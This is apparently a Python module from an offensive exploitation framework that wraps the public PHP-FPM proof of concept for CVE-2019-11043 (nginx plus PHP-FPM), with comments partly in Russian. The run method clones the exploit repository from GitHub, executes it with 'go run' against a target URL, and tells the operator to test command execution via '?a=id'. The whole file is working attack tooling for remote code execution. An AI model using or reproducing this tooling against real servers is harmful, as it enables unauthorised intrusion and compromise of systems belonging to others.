"""CVE-2019-11043 — PHP-FPM env_path_info underflow (nginx + PHP-FPM).
Обёртка над neex/phuip-fpizdam.
Требования: git, go (golang).
"""
import sys, subprocess
from pathlib import Path
from framework import Module, C, require

REPO = "https://github.com/neex/phuip-fpizdam.git"
WORK = Path.home() / ".rce-tool" / "phuip-fpizdam"

class CVE201911043(Module):
name = "cve_2019_11043"
description = "PHP-FPM underflow RCE (nginx + PHP-FPM, neex PoC)"
author = "you"

options = {
"TARGET": {"value": None, "required": True, "description": "Target URL, e.g. http://10.10.10.5/index.php"},
}

def _ensure(self) -> bool:
if (WORK / "main.go").exists():
return True
WORK.parent.mkdir(parents=True, exist_ok=True)
print(f"{C.Y}[*] Cloning {REPO}{C.END}")
r = subprocess.run(["git", "clone", "--depth", "1", REPO, str(WORK)],
capture_output=True, text=True)
if r.returncode != 0:
print(f"{C.R}[!] git clone failed: {r.stderr}{C.END}")
return False
return True

def run(self):
miss = require("git", "go")
if miss:
print(f"{C.R}[!] Missing: {', '.join(miss)} (для сборки нужен Go){C.END}")
return
if not self._ensure(): return
target = self.get("TARGET")
cmd = ["go", "run", ".", target]
print(f"{C.Y}[*] Running: {' '.join(cmd)}{C.END}")
print(f"{C.DIM} После атаки проверь {target}?a=id{C.END}")
subprocess.run(cmd, cwd=str(WORK))
